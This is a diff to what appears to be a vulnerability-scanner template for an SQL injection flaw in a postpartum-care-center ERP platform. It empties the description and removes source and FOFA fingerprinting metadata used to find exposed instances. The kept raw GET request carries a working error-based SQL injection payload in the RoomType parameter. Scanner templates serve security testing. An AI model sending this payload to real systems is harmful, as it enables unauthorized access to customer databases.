@@ -3,12 +3,8 @@ info:
   name: 月子会所ERP管理云平台 BindRoomListData 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wdlnd30xzho20rhy'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wdlnd30xzho20rhy
-    fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
 http:
 - raw:
   - 'GET /Page/SalerManager/ashx/BindRoomListData.ashx?RZParam=1&RoomID=1&RoomName=1&RoomStyle=1&RoomType=1''%20and%201%3dconvert(int,@@version)--&ddlFStoreID=1&IsShowCount=1 HTTP/1.1
